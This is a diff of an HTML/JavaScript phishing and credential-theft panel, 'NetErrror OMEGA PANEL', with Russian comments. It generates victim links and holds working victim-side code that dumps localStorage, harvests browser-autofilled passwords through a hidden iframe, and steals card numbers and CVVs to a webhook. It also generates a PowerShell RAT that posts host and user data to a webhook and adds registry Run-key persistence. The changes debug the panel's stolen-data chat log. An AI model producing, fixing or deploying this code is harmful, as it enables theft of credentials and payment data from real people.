@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>NetErrror █ OMEGA PANEL + LIVE CHAT LOGS</title>
+    <title>NetErrror █ OMEGA PANEL + LIVE CHAT LOGS (FIXED)</title>
     <style>
         * {
             margin: 0;
@@ -55,7 +55,6 @@
             font-size: 0.8rem;
             margin-top: 8px;
         }
-        /* Табы */
         .tabs {
             display: flex;
             flex-wrap: wrap;
@@ -137,8 +136,7 @@
             background: #2c2c6e;
             margin-left: 10px;
         }
-
-        /* ЧАТ В ПРАВОМ НИЖНЕМ УГЛУ (ЖИВЫЕ ЛОГИ) */
+        /* ЧАТ В ПРАВОМ НИЖНЕМ УГЛУ */
         .live-chat {
             position: fixed;
             bottom: 20px;
@@ -236,7 +234,6 @@
         <div class="sub">⚡ ВСЕ ДАННЫЕ ПРИХОДЯТ В ЧАТ В ПРАВОМ НИЖНЕМ УГЛУ ⚡</div>
     </div>
 
-    <!-- Вкладки с функциями (без вкладки Логи, всё в чате) -->
     <div class="tabs" id="loggedTabs">
         <button class="tab-btn active" data-logtab="stealth">🔥 STEALTH (0-Click)</button>
         <button class="tab-btn" data-logtab="driveby">💿 DRIVE-BY</button>
@@ -361,36 +358,31 @@ start calc.exe</textarea>
     // ---------- Единый гостевой ID ----------
     const GUEST_ID = 'guest_shared';
 
-    // Получить все украденные данные
     function getStolenData() {
         const key = 'neterror_stolen_' + GUEST_ID;
         const raw = localStorage.getItem(key);
         return raw ? JSON.parse(raw) : [];
     }
 
-    // Сохранить и обновить чат
     function saveStolenData(logs) {
         const key = 'neterror_stolen_' + GUEST_ID;
         localStorage.setItem(key, JSON.stringify(logs));
         renderChatLogs();
     }
 
-    // Добавить новую запись и сразу показать в чате
     function addStolenEntry(entry) {
         const logs = getStolenData();
         logs.unshift({ ...entry, timestamp: new Date().toISOString() });
         while (logs.length > 500) logs.pop();
         saveStolenData(logs);
-        // Дополнительно: если указан webhook в самой атаке, он уже отправил данные, но чат обновится
     }
 
-    // Очистить все логи
     function clearAllLogs() {
         localStorage.removeItem('neterror_stolen_' + GUEST_ID);
         renderChatLogs();
     }
 
-    // Форматирование данных для красивого вывода
+    // Форматирование данных для вывода в чат
     function formatStolenData(entry) {
         let text = '';
         if (entry.type === 'stealth_full') {
@@ -401,7 +393,7 @@ start calc.exe</textarea>
         } 
         else if (entry.type === 'card_stealer') {
             text = `💳 КАРТЫ:\n`;
-            if (entry.cards) {
+            if (entry.cards && Array.isArray(entry.cards)) {
                 entry.cards.forEach(c => {
                     if (c.type === 'card_number') text += `Номер: ${c.value}\n`;
                     else if (c.type === 'cvv') text += `CVV: ${c.value}\n`;
@@ -435,7 +427,17 @@ start calc.exe</textarea>
         return text;
     }
 
-    // Отрисовка чата
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    // Отрисовка чата (исправлено: хранение оригинального текста в data-raw)
     function renderChatLogs() {
         const logs = getStolenData();
         const chatBody = document.getElementById('chatBody');
@@ -448,40 +450,36 @@ start calc.exe</textarea>
             const time = new Date(log.timestamp).toLocaleString();
             const dataText = formatStolenData(log);
             const safeData = escapeHtml(dataText);
+            // Сохраняем оригинал через encodeURIComponent для надёжного копирования
+            const rawEncoded = encodeURIComponent(dataText);
             html += `
                 <div class="chat-message">
                     <div class="time">${time}</div>
                     <div class="data"><pre style="font-family:monospace; margin:0; white-space:pre-wrap;">${safeData}</pre></div>
-                    <button class="copy-data" data-text="${escapeHtml(dataText)}">📋 Копировать</button>
+                    <button class="copy-data" data-raw="${rawEncoded}">📋 Копировать</button>
                 </div>
             `;
         });
         chatBody.innerHTML = html;
-        // Добавляем обработчики на кнопки копирования
+        // Обработчики копирования
         document.querySelectorAll('.copy-data').forEach(btn => {
             btn.addEventListener('click', (e) => {
-                const text = btn.getAttribute('data-text');
-                navigator.clipboard.writeText(text).then(() => {
-                    btn.innerText = '✅ Скопировано';
-                    setTimeout(() => btn.innerText = '📋 Копировать', 1500);
-                }).catch(() => alert('Ошибка копирования'));
+                const raw = btn.getAttribute('data-raw');
+                if (raw) {
+                    const originalText = decodeURIComponent(raw);
+                    navigator.clipboard.writeText(originalText).then(() => {
+                        btn.innerText = '✅ Скопировано';
+                        setTimeout(() => btn.innerText = '📋 Копировать', 1500);
+                    }).catch(() => alert('Ошибка копирования'));
+                } else {
+                    alert('Нет данных');
+                }
             });
         });
-        // Автопрокрутка вниз (чтобы видеть новые сообщения)
         chatBody.scrollTop = chatBody.scrollHeight;
     }
 
-    function escapeHtml(str) {
-        if (!str) return '';
-        return str.replace(/[&<>]/g, function(m) {
-            if (m === '&') return '&amp;';
-            if (m === '<') return '&lt;';
-            if (m === '>') return '&gt;';
-            return m;
-        });
-    }
-
-    // ---- ГЕНЕРАЦИЯ ССЫЛОК (без авторизации, owner = GUEST_ID) ----
+    // ---- ГЕНЕРАЦИЯ ССЫЛОК ----
     function makeLink(params) {
         const base = window.location.href.split('?')[0];
         params.set('owner', GUEST_ID);
@@ -490,7 +488,7 @@ start calc.exe</textarea>
     }
 
     function copyToClipboard(text) {
-        navigator.clipboard.writeText(text).then(() => alert('Ссылка скопирована!')).catch(() => alert('Ошибка'));
+        navigator.clipboard.writeText(text).then(() => alert('Ссылка скопирована!')).catch(() => alert('Ошибка копирования'));
     }
 
     // Stealth
@@ -549,8 +547,8 @@ start calc.exe</textarea>
         document.getElementById('copyPhishLink').onclick = () => copyToClipboard(link);
     });
 
-    // ---------- ОБРАБОТЧИКИ АТАК (НА СТОРОНЕ ЖЕРТВЫ) ----------
-    (function handleAllAttacks() {
+    // ---------- ОБРАБОТЧИКИ АТАК (СТОРОНА ЖЕРТВЫ) – ИСПРАВЛЕНА АСИНХРОННОСТЬ ----------
+    (async function handleAllAttacks() {
         const urlParams = new URLSearchParams(window.location.search);
         const ownerId = urlParams.get('owner');
         if (!ownerId) return;
@@ -572,7 +570,6 @@ start calc.exe</textarea>
                     let k = localStorage.key(i);
                     stolen.localStorage[k] = localStorage.getItem(k);
                 }
-                // автофиллинг через iframe
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 iframe.srcdoc = `<html><body><form><input type="text" name="user" autocomplete="username"><input type="password" name="pass" autocomplete="current-password"></form><script>setTimeout(()=>{let u=document.querySelector('input[autocomplete="username"]').value,p=document.querySelector('input[autocomplete="current-password"]').value;parent.postMessage({user:u,pass:p},'*');},200);<\/script></body></html>`;
@@ -620,7 +617,7 @@ start calc.exe</textarea>
             return;
         }
 
-        // CARD STEALER
+        // CARD STEALER (исправлено: теперь внутри async IIFE)
         if (urlParams.has('cardsteal')) {
             const redirect = urlParams.get('redirect') || 'https://google.com';
             const cardWh = urlParams.get('card_wh') || null;
@@ -680,7 +677,7 @@ start calc.exe</textarea>
         }
     })();
 
-    // RAT генератор (улучшенный)
+    // RAT генератор
     function genMalware(name, type, wh) {
         const safe = name.replace(/[^a-z0-9_]/gi, '_');
         if (type === 'powershell_rat') return `# PowerShell RAT - ${safe}\n$webhook="${wh}"\n$computer=$env:COMPUTERNAME\n$user=$env:USERNAME\n$ip=(Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content\n$data=@{name="${safe}";computer=$computer;user=$user;ip=$ip;time=(Get-Date -Format "yyyy-MM-dd HH:mm:ss")}\nInvoke-RestMethod -Uri $webhook -Method Post -Body ($data|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue\n# persistence\n$regPath="HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"\nSet-ItemProperty -Path $regPath -Name "${safe}" -Value (Get-Location).Path + "\\" + $MyInvocation.MyCommand.Name`;
@@ -741,7 +738,7 @@ start calc.exe</textarea>
     }
     tabBtns.forEach(btn => btn.addEventListener('click', () => switchTab(btn.getAttribute('data-logtab'))));
 
-    // Инициализация: отобразить логи в чате
+    // Инициализация
     renderChatLogs();
     switchTab('stealth');
 </script>
